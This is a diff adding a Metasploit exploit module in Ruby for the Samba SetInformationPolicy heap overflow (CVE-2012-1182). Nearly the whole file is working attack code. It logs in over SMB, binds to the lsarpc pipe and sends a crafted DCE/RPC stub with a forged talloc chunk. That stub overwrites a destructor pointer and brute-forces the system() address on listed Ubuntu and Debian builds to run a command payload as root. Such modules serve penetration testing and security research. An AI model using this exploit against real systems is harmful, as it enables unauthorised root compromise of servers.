@@ -1,0 +1,325 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+
+require 'msf/core'
+
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = NormalRanking
+
+	include Msf::Exploit::Remote::DCERPC
+	include Msf::Exploit::Remote::SMB
+	include Msf::Exploit::Brute
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Samba SetInformationPolicy AuditEventsInfo Heap Overflow',
+			'Description'    => %q{
+					This module triggers a vulnerability in the LSA RPC service of the Samba daemon
+				because of an error on the PIDL auto-generated code. Making a specially crafted
+				call to SetInformationPolicy to set a PolicyAuditEventsInformation allows to
+				trigger a heap overflow and finally execute arbitrary code with root privileges.
+
+				The module uses brute force to guess the system() address and redirect flow there
+				in order to bypass NX. The start and stop addresses for brute forcing have been
+				calculated empirically. On the other hand the module provides the StartBrute and
+				StopBrute which allow the user to configure his own addresses.
+			},
+			'Author'         =>
+				[
+					'Unknown', # Vulnerability discovery
+					'blasty', # Exploit
+					'mephos', # Debian Squeeze target
+					'sinn3r', # Metasploit module
+					'juan vazquez' # Metasploit module
+				],
+			'License'        => MSF_LICENSE,
+			'References'     =>
+				[
+					['CVE', '2012-1182'],
+					['OSVDB', '81303'],
+					['BID', '52973'],
+					['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-069/']
+				],
+			'Privileged'     => true,
+			'Payload'        =>
+				{
+					'DisableNops' => true,
+					'Space'       => 811,
+					'Compat'      =>
+						{
+							'PayloadType' => 'cmd',
+							'RequiredCmd' => 'generic bash telnet python perl'
+						}
+				},
+			'Platform'       => 'unix',
+			'Arch'           => ARCH_CMD,
+			'Targets'        =>
+				[
+					# gdb /usr/sbin/smbd `ps auwx | grep smbd | grep -v grep | head -n1 | awk '{ print $2 }'` <<< `echo -e "print system"` | grep '$1'
+					['2:3.5.11~dfsg-1ubuntu2 and 2:3.5.8~dfsg-1ubuntu2 on Ubuntu 11.10',
+						{
+							'Offset' => 0x11c0,
+							'Bruteforce' =>
+							{
+								# The start for the final version should be 0xb20 aligned, and then step 0x1000.
+								'Start' => { 'Ret' => 0x00230b20 },
+								'Stop'  => { 'Ret' => 0x22a00b20 },
+								'Step'  => 0x1000
+							}
+						}
+					],
+					['2:3.5.8~dfsg-1ubuntu2 and 2:3.5.4~dfsg-1ubuntu8 on Ubuntu 11.04',
+						{
+							'Offset' => 0x11c0,
+							'Bruteforce' =>
+							{
+								# The start should be 0x950 aligned, and then step 0x1000.
+								'Start' => { 'Ret' => 0x00230950 },
+								'Stop'  => { 'Ret' => 0x22a00950 },
+								'Step'  => 0x1000
+							}
+						}
+					],
+					['2:3.5.4~dfsg-1ubuntu8 on Ubuntu 10.10',
+						{
+							'Offset' => 0x11c0,
+							'Bruteforce' =>
+							{
+								# The start should be 0x680 aligned, and then step 0x1000.
+								'Start' => { 'Ret' => 0x00230680 },
+								'Stop'  => { 'Ret' => 0x22a00680 },
+								'Step'  => 0x1000
+							}
+						}
+					],
+					['2:3.5.6~dfsg-3squeeze6 on Debian Squeeze',
+						{
+							'Offset' => 0x11c0,
+							'Bruteforce' =>
+							{
+								# The start should be 0x680 aligned, and then step 0x1000.
+								'Start' => { 'Ret' => 0xb6aaa1b0 },
+								'Stop'  => { 'Ret' => 0xb6ce91b0 },
+								'Step'  => 0x1000
+							}
+						}
+					]
+				],
+			'DisclosureDate' => 'Apr 10 2012',
+			'DefaultTarget'  => 0
+			))
+
+		register_options([
+			OptInt.new("StartBrute", [ false, "Start Address For Brute Forcing" ]),
+			OptInt.new("StopBrute", [ false, "Stop Address For Brute Forcing" ])
+		], self.class)
+
+	end
+
+	def exploit
+		if target.bruteforce?
+			bf = target.bruteforce
+
+			if datastore['StartBrute'] and datastore['StartBrute'] > 0
+				bf.start_addresses['Ret'] = datastore['StartBrute']
+			end
+
+			if datastore['StopBrute'] and datastore['StopBrute'] > 0
+				bf.stop_addresses['Ret'] = datastore['StopBrute']
+			end
+
+			if bf.start_addresses['Ret'] > bf.stop_addresses['Ret']
+				raise ArgumentError, "StartBrute should not be larger than StopBrute"
+			end
+		end
+		super
+	end
+
+	def check
+		begin
+			connect()
+			smb_login()
+			disconnect()
+
+			version = smb_peer_lm().scan(/Samba (\d\.\d.\d*)/).flatten[0]
+			minor   = version.scan(/\.(\d*)$/).flatten[0].to_i
+			print_status("Version found: #{version}")
+
+			return Exploit::CheckCode::Appears if version =~ /^3\.4/ and minor < 16
+			return Exploit::CheckCode::Appears if version =~ /^3\.5/ and minor < 14
+			return Exploit::CheckCode::Appears if version =~ /^3\.6/ and minor < 4
+
+			return Exploit::CheckCode::Safe
+
+		rescue ::Exception
+			return CheckCode::Unknown
+		end
+	end
+
+	def brute_exploit(target_addrs)
+
+		print_status("Trying to exploit Samba with address 0x%.8x..." % target_addrs['Ret'])
+		datastore['DCERPC::fake_bind_multi'] = false
+		datastore['DCERPC::max_frag_size'] = 4248
+
+		pipe = "lsarpc"
+
+		print_status("Connecting to the SMB service...")
+		connect()
+		print_status("Login to the SMB service...")
+		smb_login()
+
+		handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', ["\\#{pipe}"])
+		print_status("Binding to #{handle} ...")
+		dcerpc_bind(handle)
+		print_status("Bound to #{handle} ...")
+
+		stub = "X" * 20
+
+		cmd = ";;;;" # padding
+		cmd << "#{payload.encoded}\x00" # system argument
+		tmp = cmd * (816/cmd.length)
+		tmp << "\x00"*(816-tmp.length)
+
+		stub << NDR.short(2)     # level
+		stub << NDR.short(2)     # level 2
+		stub << NDR.long(1)      # auditing mode
+		stub << NDR.long(1)      # ptr
+		stub << NDR.long(100000) # r-> count
+		stub << NDR.long(20)     # array size
+		stub << NDR.long(0)
+		stub << NDR.long(100)
+		stub << rand_text_alpha(target['Offset'])
+		# Crafted talloc chunk
+		stub << 'A' * 8                       # next, prev
+		stub << NDR.long(0) + NDR.long(0)     # parent, child
+		stub << NDR.long(0)                   # refs
+		stub << NDR.long(target_addrs['Ret']) # destructor # will become EIP
+		stub << NDR.long(0)                   # name
+		stub << "AAAA"                        # size
+		stub << NDR.long(0xe8150c70)          # flags
+		stub << "AAAABBBB"
+		stub << tmp # pointer to tmp+4 in $esp
+		stub << rand_text(32632)
+		stub << rand_text(62000)
+
+		print_status("Calling the vulnerable function...")
+
+		begin
+			call(dcerpc, 0x08, stub)
+		rescue Rex::Proto::DCERPC::Exceptions::NoResponse, Rex::Proto::SMB::Exceptions::NoReply, ::EOFError
+			print_status('Server did not respond, this is expected')
+		rescue Rex::Proto::DCERPC::Exceptions::Fault
+			print_error('Server is most likely patched...')
+		rescue => e
+			if e.to_s =~ /STATUS_PIPE_DISCONNECTED/
+				print_status('Server disconnected, this is expected')
+			end
+		end
+
+		handler
+		disconnect
+	end
+
+	# Perform a DCE/RPC Function Call
+	def call(dcerpc, function, data, do_recv = true)
+
+		frag_size = data.length
+		if dcerpc.options['frag_size']
+			frag_size = dcerpc.options['frag_size']
+		end
+		object_id = ''
+		if dcerpc.options['object_call']
+			object_id = dcerpc.handle.uuid[0]
+		end
+		if options['random_object_id']
+			object_id = Rex::Proto::DCERPC::UUID.uuid_unpack(Rex::Text.rand_text(16))
+		end
+
+		call_packets = make_request(function, data, frag_size, dcerpc.context, object_id)
+		call_packets.each { |packet|
+			write(dcerpc, packet)
+		}
+
+		return true if not do_recv
+
+		raw_response = ''
+
+		begin
+			raw_response = dcerpc.read()
+		rescue ::EOFError
+			raise Rex::Proto::DCERPC::Exceptions::NoResponse
+		end
+
+		if (raw_response == nil or raw_response.length == 0)
+			raise Rex::Proto::DCERPC::Exceptions::NoResponse
+		end
+
+
+		dcerpc.last_response = Rex::Proto::DCERPC::Response.new(raw_response)
+
+		if dcerpc.last_response.type == 3
+			e = Rex::Proto::DCERPC::Exceptions::Fault.new
+			e.fault = dcerpc.last_response.status
+			raise e
+		end
+
+		dcerpc.last_response.stub_data
+	end
+
+	# Used to create standard DCERPC REQUEST packet(s)
+	def make_request(opnum=0, data="", size=data.length, ctx=0, object_id = '')
+
+		opnum = opnum.to_i
+		size = size.to_i
+		ctx   = ctx.to_i
+
+		chunks, frags = [], []
+		ptr = 0
+
+		# Break the request into fragments of 'size' bytes
+		while ptr < data.length
+			chunks.push( data[ ptr, size ] )
+			ptr += size
+		end
+
+		# Process requests with no stub data
+		if chunks.length == 0
+			frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(3, opnum, '', ctx, object_id) )
+			return frags
+		end
+
+		# Process requests with only one fragment
+		if chunks.length == 1
+			frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(3, opnum, chunks[0], ctx, object_id) )
+			return frags
+		end
+
+		# Create the first fragment of the request
+		frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(1, opnum, chunks.shift, ctx, object_id) )
+
+		# Create all of the middle fragments
+		while chunks.length != 1
+			frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(0, opnum, chunks.shift, ctx, object_id) )
+		end
+
+		# Create the last fragment of the request
+		frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(2, opnum, chunks.shift, ctx, object_id) )
+
+		return frags
+	end
+
+	# Write data to the underlying socket
+	def write(dcerpc, data)
+		dcerpc.socket.write(data)
+		data.length
+	end
+
+end
+
